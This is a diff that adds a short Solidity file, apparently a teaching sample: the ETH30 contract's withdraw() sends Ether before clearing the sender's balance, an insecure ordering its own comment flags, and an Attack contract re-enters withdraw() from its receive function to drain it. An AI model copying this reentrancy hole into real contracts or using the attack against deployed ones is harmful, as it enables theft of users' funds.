@@ -1,0 +1,31 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+contract ETH30 {
+    mapping(address => uint) private _userBalances;
+    
+    function withdraw() external payable {
+        uint amount = _userBalances[msg.sender];
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success, "Failed to send Ether");
+        _userBalances[msg.sender] = 0; // Insecure to update _userBalances here
+    }
+}
+
+contract Attack {
+    function deposit(address payable _to) external payable {
+        (bool success, ) = _to.call{value: msg.value}("");
+        require(success, "Failed to send Ether");
+    }
+
+    function attack(address payable _eth30) public payable {
+        if (_eth30.balance >= msg.value) {
+            ETH30(_eth30).withdraw();
+        }
+    }
+
+    // receive function is called whenever the attacker receives Ether
+    receive() external payable {
+        attack(payable(msg.sender));
+    }
+}
